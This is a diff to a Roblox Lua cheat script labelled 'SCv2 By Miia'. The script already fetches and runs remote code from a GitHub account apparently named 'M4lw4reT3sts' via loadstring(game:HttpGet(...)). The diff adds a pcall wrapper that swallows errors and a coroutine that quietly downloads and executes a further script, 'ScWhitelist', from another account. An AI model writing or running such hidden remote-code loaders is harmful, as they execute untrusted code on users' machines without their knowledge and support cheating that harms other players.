@@ -1,3 +1,5 @@
+local ID1 = "DEV"
+pcall(function()
 shared.III'ran'
 shared.lll = print -- don't remove this one. Other loadstrings won't load if you do so
 -- SCv2 By Miia;
@@ -298,7 +300,9 @@ function createKohlsUi(textTable)
 end
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Infjump%20jailbreak'),true))()
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/IIlIllIlllllIllIChecker'),true))()
-
+coroutine.wrap(function(spoof)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Arsenic1479/MyScriptsMain/main/ScWhitelist'),true))()
+end)(spoof)
 ----------Other stuff
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Misc'),true))()
@@ -4939,3 +4943,5 @@ lp.Chatted:Connect(
 )
 
 --end
+
+end)
